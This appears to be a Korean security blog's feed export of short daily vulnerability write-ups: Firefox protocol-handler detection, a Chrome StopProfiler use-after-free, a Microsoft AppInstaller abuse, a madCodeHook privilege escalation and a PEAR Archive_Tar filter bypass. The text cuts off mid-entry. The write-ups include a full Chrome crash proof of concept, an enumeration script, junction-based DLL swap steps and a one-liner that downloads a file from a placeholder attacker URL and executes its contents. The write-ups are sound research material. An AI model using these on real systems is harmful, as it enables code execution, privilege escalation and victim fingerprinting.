alt></p><p>&#xC9E0;!</p><h1 id="&#xB9C8;&#xCE58;&#xBA70;"><a href="#&#xB9C8;&#xCE58;&#xBA70;" class="headerlink" title="&#xB9C8;&#xCE58;&#xBA70;"></a>&#xB9C8;&#xCE58;&#xBA70;</h1><p>RET sled &#xB9D0;&#xACE0;&#xB3C4; stack alignment&#xB97C; &#xC720;&#xC9C0;&#xD558;&#xBA74;&#xC11C; ROP &#xD558;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC0AC;&#xC2E4; &#xD55C; &#xAC00;&#xC9C0; &#xBC29;&#xBC95; &#xB354; &#xBCF4;&#xC5EC;&#xB4DC;&#xB9AC;&#xB824;&#xACE0; &#xD588;&#xB294;&#xB370; &#xADF8;&#xAC74; endbr64&#xB791; CET&#xAE4C;&#xC9C0; &#xC124;&#xBA85;&#xD574;&#xC57C; &#xB3FC;&#xC11C; &#xAE30;&#xD68C;&#xAC00; &#xB418;&#xBA74; &#xB530;&#xB85C; &#xAE00;&#xC744; &#xC791;&#xC131;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/23.png" alt></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bof</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>pwnable</tag>
      
      <tag>stack alignment</tag>
      
      <tag>rtl</tag>
      
      <tag>rop</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-15680 : protocol handler infomation disclosure</title>
    <link href="/2020/12/05/fabu1ous/2020-12-05/"/>
    <url>/2020/12/05/fabu1ous/2020-12-05/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.fortinet.com/blog/threat-research/leaking-browser-url-protocol-handlers?utm_source=feedburner&amp;utm_medium=feed&amp;utm_campaign=Feed%3A+fortinet%2Fblog%2Fthreat-research+%28Fortinet+Threat+Research+Blog%29">leaking browser url/protocol handler</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Firebox 78.01</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Firefox&#xC5D0;&#xC11C; Protocol Handler&#xB97C; &#xC774;&#xC6A9;&#xD55C; Information Disclosure &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. Protocol Handler&#xB294; &#xC751;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC790;&#xC2E0;&#xC758; URI scheme&#xB97C; &#xB4F1;&#xB85D;&#xD560; &#xC218; &#xC788;&#xB294; &#xB9E4;&#xCEE4;&#xB2C8;&#xC998;&#xC73C;&#xB85C; &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xAC00; Protocol Handler URI&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#x201C;&#xC6F9;&#xC0AC;&#xC774;&#xD2B8;&#xC5D0;&#xC11C; &#xC774; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC744; &#xC5F4;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.&#x201D;&#xB77C;&#xB294; &#xC54C;&#xB9BC;&#xC774; &#xB739;&#xB2C8;&#xB2E4;.  </p><p>Firefox&#xAC00; &#xC774;&#xBBF8;&#xC9C0; &#xD0DC;&#xADF8;&#xC758; &#xC18C;&#xC2A4;&#xB97C; &#xB80C;&#xB354;&#xB9C1; &#xD560; &#xB54C;, Protocol Handler&#xC758; &#xC874;&#xC7AC; &#xC5EC;&#xBD80;&#xC5D0; &#xB530;&#xB77C; &#xB80C;&#xB354;&#xB9C1; &#xACB0;&#xACFC;&#xAC00; &#xB2E4;&#xB985;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xB294; &#xC774;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD574; &#xC6D0;&#xACA9;&#xC73C;&#xB85C; victim&#xC5D0; &#xC124;&#xCE58;&#xB41C; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&#xC874;&#xC7AC;&#xD558;&#xB294;ProtocolHandler://abc&quot;</span>&gt;</span></code></pre><p>victim&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; Protocol Handler&#xB97C; &#xC774;&#xBBF8;&#xC9C0; src&#xC5D0; &#xB123;&#xC73C;&#xBA74; broken image&#xC5D0; &#xB300;&#xD55C; &#xAE30;&#xBCF8; &#xC124;&#xC815;&#xC5D0; &#xB530;&#xB77C; Element&#xC758; size&#xAC00; 24x24&#xB85C; &#xB80C;&#xB354;&#xB9C1; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs HTML"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&#xC874;&#xC7AC;&#xD558;&#xC9C0;&#xC54A;&#xB294;ProtocolHandler://abc&quot;</span>&gt;</span></code></pre><p>&#xBC18;&#xBA74;, &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xB294; Protocol Handler&#xB97C; &#xC774;&#xBBF8;&#xC9C0; src&#xC5D0; &#xB123;&#xC73C;&#xBA74; Element&#xC758; size&#xB294; 0x0&#xC73C;&#xB85C; &#xC124;&#xC815;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; &#xD574;&#xCEE4;&#xB294; &#xAC04;&#xB2E8;&#xD55C; JS script&#xB85C; Element&#xC758; width&#xB97C; &#xAC80;&#xC0AC;&#xD574; Protocol Handler&#xC758; &#xC874;&#xC7AC; &#xC5EC;&#xBD80;&#xB97C; &#xD655;&#xC778;&#xD558;&#xB294; brute force &#xACF5;&#xACA9;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs javascript">known_handlers = [  ...]  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = knwon_handers.length <span class="hljs-number">-1</span>; i&gt;=<span class="hljs-number">0</span>; i--){  handler_id = <span class="hljs-string">&apos;handler_&apos;</span> + i  $(<span class="hljs-string">&apos;body&apos;</span>).append(<span class="hljs-string">&apos;&lt;img id =&quot;&apos;</span> + handler_id + <span class="hljs-string">&apos;&quot;src=&quot;&apos;</span>+known_handers[i]  + <span class="hljs-string">&apos;://192.168.133.142/&quot;&gt;&lt;/img&gt;&apos;</span>)  <span class="hljs-keyword">if</span>($(<span class="hljs-string">&apos;#&apos;</span> + handler_id).css(<span class="hljs-string">&apos;width&apos;</span>) == <span class="hljs-string">&quot;24px&quot;</span>){    $(<span class="hljs-string">&apos;&lt;p&gt;Handler &apos;</span> + known_handlers[i] + <span class="hljs-string">&apos;Exists&lt;/p&gt;&apos;</span>).appendTo(<span class="hljs-string">&apos;#logbox&apos;</span>);  }  <span class="hljs-keyword">else</span>{    $(<span class="hljs-string">&apos;&lt;p&gt;Hander &apos;</span> + known_handers[i] + <span class="hljs-string">&apos;Does not exists&lt;/p&gt;&apos;</span>).appendTo(<span class="hljs-string">&apos;#logbox&apos;</span>);  }    $(<span class="hljs-string">&apos;#&apos;</span> + hander_id).remove()}</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>information disclosure</tag>
      
      <tag>Fabu1ous</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Chrome UAF in StopProfiler</title>
    <link href="/2020/12/04/l0ch/2020-12-04/"/>
    <url>/2020/12/04/l0ch/2020-12-04/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1119865">Chrome UAF in StopProfiler</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Chrome (Operating System: all)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CPU &#xB4F1;&#xC758; &#xB9AC;&#xC18C;&#xC2A4; &#xC0AC;&#xC6A9;&#xB7C9;&#xC744; &#xBAA8;&#xB2C8;&#xD130;&#xB9C1;&#xD560; &#xC218; &#xC788;&#xB294; <code>profiler</code> &#xAC1D;&#xCCB4;&#xC5D0;&#xC11C; &#xBE44;&#xB3D9;&#xAE30; &#xCC98;&#xB9AC; &#xD0A4;&#xC6CC;&#xB4DC;&#xB97C; &#xC0AC;&#xC6A9;&#xD55C; UAF &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC758; POC&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">&lt;html&gt;    &lt;body&gt;    &lt;/body&gt;    &lt;script&gt;        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gc</span>(<span class="hljs-params"></span>) </span>{            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100000</span>; ++i) {                <span class="hljs-keyword">var</span> a = <span class="hljs-keyword">new</span> <span class="hljs-built_in">String</span>();            }        }        <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>)</span>{            <span class="hljs-keyword">var</span> pf = <span class="hljs-keyword">await</span> performance.profile({ <span class="hljs-attr">sampleInterval</span>: <span class="hljs-number">10</span> });            <span class="hljs-built_in">console</span>.log(pf);            cnt = <span class="hljs-number">0</span>;            <span class="hljs-built_in">Object</span>.prototype.__defineGetter__(<span class="hljs-string">&quot;then&quot;</span>, <span class="hljs-function">()=&gt;</span>{                <span class="hljs-keyword">if</span>( cnt == <span class="hljs-number">0</span>){                    cnt ++;                    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;hello&quot;</span>);                    pf.stop();                    gc();                }            })            pf.stop();        }        main();    &lt;/script&gt;&lt;/html&gt;</code></pre><pre><code class="hljs jsx"><span class="hljs-keyword">void</span> ProfilerGroup::StopProfiler(ScriptState* script_state,                                 Profiler* profiler,                                 ScriptPromiseResolver* resolver) {...  auto* trace = ProfilerTraceBuilder::FromProfile(      script_state, profile, profiler-&gt;SourceOrigin(), profiler-&gt;TimeOrigin());  resolver-&gt;Resolve(trace);  <span class="hljs-keyword">if</span> (profile)    profile-&gt;Delete();  profilers_.erase(profiler);...</code></pre><p><code>ProfilerGroup::StopProfiler</code> &#xD568;&#xC218;&#xC758; resolve&#xB294; &#xC0AC;&#xC6A9;&#xC790; &#xC815;&#xC758; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xBE44;&#xB3D9;&#xAE30; &#xD568;&#xC218;&#xB85C; &#xC120;&#xC5B8;&#xD55C; <code>main</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; <code>await</code> &#xD0A4;&#xC6CC;&#xB4DC;&#xB85C; <code>performance.profile</code> &#xAC1D;&#xCCB4;&#xB97C; &#xC120;&#xC5B8;&#xD558;&#xACE0; <code>Object.prototype.__defineGetter__</code> &#xC758; &#xC0AC;&#xC6A9;&#xC790; &#xC815;&#xC758; &#xD568;&#xC218;&#xC640; main&#xC5D0;&#xC11C; <code>stop</code> &#xC744; &#xB450; &#xBC88; &#xD638;&#xCD9C;&#xD558;&#xAC8C; &#xB418;&#xBA74;  <code>CpuProfile</code> &#xAC1D;&#xCCB4;&#xAC00; &#xC0AD;&#xC81C;&#xB429;&#xB2C8;&#xB2E4;. &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; <code>CpuProfile</code> &#xC5D0;&#xC11C; UAF &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB294; &#xAC04;&#xB2E8;&#xD558;&#xC9C0;&#xB9CC; &#xB192;&#xC740; &#xC2EC;&#xAC01;&#xC131;&#xC758; UAF &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C;, Google&#xC740; <code>Profiler::stop</code> &#xC5D0;&#xC11C; &#xB3D9;&#xAE30; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xC2E4;&#xD589;&#xC744; &#xBC29;&#xC9C0;&#xD558;&#xB3C4;&#xB85D; &#xD328;&#xCE58;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://chromium-review.googlesource.com/c/chromium/src/+/2373184">https://chromium-review.googlesource.com/c/chromium/src/+/2373184</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>uaf</tag>
      
      <tag>javascript</tag>
      
      <tag>chrome</tag>
      
      <tag>L0ch</tag>
      
      <tag>asynchronous</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Microsoft AppInstaller.exe Arbitrary File Download</title>
    <link href="/2020/12/03/idioth/2020-12-03/"/>
    <url>/2020/12/03/idioth/2020-12-03/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://twitter.com/notwhickey/status/1333900137232523264">https://twitter.com/notwhickey/status/1333900137232523264</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Microsoft AppInstaller</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft App Installer&#xC5D0;&#xC11C; arbitrary file download&#xB97C; &#xD558;&#xC5EC; lolbin(<a href="https://www.cynet.com/attack-techniques-hands-on/what-are-lolbins-and-how-do-attackers-use-them-in-fileless-attacks/">living of the land binary</a>)&#xC73C;&#xB85C; &#xD65C;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xBC29;&#xBC95;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC6F9; &#xC11C;&#xBC84;&#xC5D0;&#xC11C; &#xC571; &#xD328;&#xD0A4;&#xC9C0;&#xB97C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD560; &#xB54C; &#xACFC;&#xC815;&#xC744; &#xAC04;&#xC18C;&#xD654;&#xD558;&#xC5EC; &#xD6A8;&#xC728;&#xC801;&#xC73C;&#xB85C; &#xD558;&#xAE30; &#xC704;&#xD574; &#xC6F9; &#xC11C;&#xBC84;&#xC5D0;&#xC11C; &#xC9C1;&#xC811; &#xC571;&#xC744; &#xC124;&#xCE58;&#xD560; &#xC218; &#xC788;&#xB294; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;. &#xC6F9; &#xD398;&#xC774;&#xC9C0;&#xC5D0;&#xC11C; &#xC571; &#xD328;&#xD0A4;&#xC9C0;&#xB97C; &#xD638;&#xC2A4;&#xD305; &#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; <code>ms-appinstaller:?source=</code> URI&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; <code>source=</code>&#xC5D0; &#xBA85;&#xC2DC;&#xB41C; &#xC8FC;&#xC18C;&#xC5D0; &#xC788;&#xB294; &#xD30C;&#xC77C;&#xC5D0; &#xB300;&#xD55C; &#xC571; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xB97C; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD558;&#xC5EC; &#xD574;&#xCEE4;&#xB294; &#xC790;&#xC2E0;&#xC758; &#xC545;&#xC131; &#xD30C;&#xC77C;&#xC744; source&#xC5D0; &#xC791;&#xC131;&#xD558;&#xC5EC; arbitrary file download&#xC744; &#xC9C4;&#xD589;&#xD560; &#xC218; &#xC788;&#xACE0; <code>forfiles</code> &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD1B5;&#xD574; &#xC571; &#xD328;&#xD0A4;&#xC9C0; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xAC00; &#xC9C4;&#xD589;&#xB41C; &#xACBD;&#xB85C;&#xC5D0;&#xC11C; &#xD30C;&#xC77C;&#xC744; &#xC870;&#xAC74;&#xBB38; &#xB4F1;&#xC73C;&#xB85C; &#xAC80;&#xC0C9;&#xD558;&#xC5EC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs taggerscript">start ms-appinstaller://?source=&lt;hacker-url&gt; &amp;&amp; timeout &lt;sleep-time&gt; &amp;&amp; taskkill /F /IM AppInstaller.exe &gt; NULforfiles /P &quot;C:<span class="hljs-symbol">\\</span>Users<span class="hljs-symbol">\\</span><span class="hljs-variable">%username%</span><span class="hljs-symbol">\\</span>AppData<span class="hljs-symbol">\\</span>Local<span class="hljs-symbol">\\</span>Packages<span class="hljs-symbol">\\</span>Microsoft.DesktopAppInstaller_8wekyb3d8bbwe<span class="hljs-symbol">\\</span>AC<span class="hljs-symbol">\\</span>INetCache&quot; /S /M * /C &quot;cmd /c if @fsize==&lt;file-size&gt; FOR /F <span class="hljs-symbol">\\</span>&quot;tokens=*<span class="hljs-symbol">\\</span>&quot; <span class="hljs-variable">%g IN (&apos;type @path&apos;) do (%</span>g);&quot; &gt; NUL</code></pre><p><img src="/2020/12/03/idioth/2020-12-03/image.png" alt></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>lolbin</tag>
      
      <tag>lolbas</tag>
      
      <tag>appinstaller</tag>
      
      <tag>arbitrary file download</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-14418 : madCodeHook library LPE</title>
    <link href="/2020/12/02/fabu1ous/2020-12-02/"/>
    <url>/2020/12/02/fabu1ous/2020-12-02/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://labs.nettitude.com/blog/cve-2020-14418-madcodehook-library-local-privilege-escalation/">CVE-2020-14418</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>All software using MadCodeHook &lt;= v4.1.3</p><ul><li>Cisco AMP &lt;= v7.2.13</li><li>Morphisec Unified Threat Prevention Platform &lt;= v4.1.2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>madCodeHook&#xC740; &#xB2E4;&#xC591;&#xD55C; API hooking &#xAE30;&#xB2A5;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xB294; third party &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC785;&#xB2C8;&#xB2E4;. madCodeHook&#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC5D0; &#xD3EC;&#xD568;&#xB41C; <code>ExprevDriver.sys</code>&#xB77C;&#xB294; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xC720;&#xC800; &#xBAA8;&#xB4DC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; <code>Protector32.dll</code> &#xD639;&#xC740; <code>Protector64.dll</code>&#xC744; &#xC0BD;&#xC785;&#xD574; &#xADF8; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xBCF4;&#xD638; &#xBC0F; &#xAC10;&#xC2DC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. DLL injection &#xACF5;&#xACA9;&#xC744; &#xBC29;&#xC9C0;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xACFC; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBAA8;&#xB2C8;&#xD130;&#xB9C1; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xBBC0;&#xB85C; &#xBA87;&#xBA87; &#xBCF4;&#xC548; &#xC81C;&#xD488;&#xC5D0;&#xC11C; madCodeHook &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC544;&#xC774;&#xB7EC;&#xB2C8;&#xD558;&#xAC8C;&#xB3C4; DLL injection&#xC744; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <code>ExprevDriver.sys</code> &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0; path redirection&#xC744; &#xC774;&#xC6A9;&#xD55C; toctou &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xACE0;, &#xD574;&#xCEE4;&#xB294; &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD574; DLL injection&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><p>&#xC2E4;&#xC81C;  <code>Protector64.dll</code>&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; juction&#xC744; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs powershell">&#x201C;mklink /J C:\users\&lt;username&gt;\Desktop\exprev C:\Program Files\Cisco\AMP\exprev&#x201D;</code></pre></li><li><p><code>ExprevDriver.sys</code>&#xC5D0; IOCTL&#xC744; &#xB118;&#xACA8;&#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs latex">&#x201C;C:<span class="hljs-tag">\<span class="hljs-name">users</span></span><span class="hljs-tag">\<span class="hljs-name">&lt;</span></span>username&gt;<span class="hljs-tag">\<span class="hljs-name">Desktop</span></span><span class="hljs-tag">\<span class="hljs-name">exprev</span></span><span class="hljs-tag">\<span class="hljs-name">Protector</span></span>64.dll&#x201D;</code></pre><p>IOCTL&#xC744; &#xC0AC;&#xC6A9;&#xD574;  <code>ExprevDriver.sys</code>&#xAC00; &#xC0BD;&#xC785;&#xD560; DLL&#xC758; &#xACBD;&#xB85C;&#xC640; &#xB300;&#xC0C1; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC9C0;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.  <code>ExprevDriver.sys</code>&#xB294; DLL&#xC744; &#xC0BD;&#xC785;&#xD558;&#xAE30; &#xC804;&#xC5D0; DLL&#xC758; &#xC804;&#xC790;&#xC11C;&#xBA85;&#xC744; &#xAC80;&#xC99D;&#xD558;&#xB294; &#xB2E8;&#xACC4;&#xB97C; &#xAC70;&#xCE58;&#xB294;&#xB370;,  IOCTL&#xB85C; &#xC124;&#xC815;&#xB41C; &#xACBD;&#xB85C;&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. Protector64.dll&#xC758; &#xACBD;&#xB85C;&#xB97C; 1&#xBC88;&#xC5D0;&#xC11C; &#xB9CC;&#xB4E4;&#xC5B4; &#xB454; juction&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p></li><li><p>&#xB514;&#xB809;&#xD130;&#xB9AC; juction&#xC744; &#xC0AD;&#xC81C;&#xD558;&#xACE0; &#xAC00;&#xC9DC; <code>Protector64.dll</code>&#xC744; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><p>DLL&#xC758; &#xC804;&#xC790;&#xC11C;&#xBA85; &#xAC80;&#xC99D; &#xC774;&#xD6C4; juction&#xC744; &#xC0AD;&#xC81C;&#xD558;&#xACE0; 2&#xBC88; &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#xC9C0;&#xC815;&#xD574;&#xC900; &#xACBD;&#xB85C;&#xC5D0; <code>Protector64.dll</code>&#xB77C;&#xB294; &#xC774;&#xB984;&#xC758; &#xC545;&#xC131; DLL&#xC744; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>toctou</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-28948/28949 : Multiple vulnerabilities through filename manipulation</title>
    <link href="/2020/12/01/l0ch/2020-12-01/"/>
    <url>/2020/12/01/l0ch/2020-12-01/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/pear/Archive_Tar/issues/33">Archive_Tar Issue - multiple vulnerabilities through filename manipulation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>PEAR Archive_Tar</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>PEAR Archive_Tar&#xB294; PHP&#xC5D0;&#xC11C; TAR &#xD30C;&#xC77C;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC5D0;&#xC11C; phar unseirialization&#xACFC; arbitrary file overwrite &#xB450; &#xAC00;&#xC9C0; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><br><br>&#xCCAB; &#xBC88;&#xC9F8; &#xCDE8;&#xC57D;&#xC810;(CVE-2020-28948)&#xC740; scheme &#xD544;&#xD130;&#xB9C1; &#xC6B0;&#xD68C;&#xB97C; &#xD1B5;&#xD55C; unserialization &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p>Archive_Tar&#xC5D0;&#xB294; unserialization &#xACF5;&#xACA9;&#xC744; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xCF54;&#xB4DC;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_maliciousFilename</span>(<span class="hljs-params">$file</span>)</span><span class="hljs-function"></span>{    <span class="hljs-keyword">if</span> (strpos($file, <span class="hljs-string">&apos;phar://&apos;</span>) === <span class="hljs-number">0</span>) {        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    }    <span class="hljs-keyword">if</span> (strpos($file, <span class="hljs-string">&apos;../&apos;</span>) !== <span class="hljs-literal">false</span> || strpos($file, <span class="hljs-string">&apos;..\\\\&apos;</span>) !== <span class="hljs-literal">false</span>) {        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    }    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;}</code></pre><p>&#xADF8;&#xB7EC;&#xB098; <code>PHAR://malicious_file.phar</code> &#xACFC; &#xAC19;&#xC774; &#xB300;&#xBB38;&#xC790;&#xB85C; &#xC791;&#xC131;&#xD558;&#xBA74; &#xD574;&#xB2F9; &#xCF54;&#xB4DC;&#xB97C; &#xC6B0;&#xD68C;&#xD574; unserialization&#xC744; &#xD1B5;&#xD55C; obejct injection&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.<br><br></p><p>&#xB450; &#xBC88;&#xC9F8; &#xCDE8;&#xC57D;&#xC810;(CVE-2020-28949)&#xC740; Archive_Tar&#xC5D0;&#xC11C; stream wrapper&#xB97C; &#xCCB4;&#xD06C;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xBC1C;&#xC0DD;&#xD558;&#xB294; arbitrary file overwrite &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; 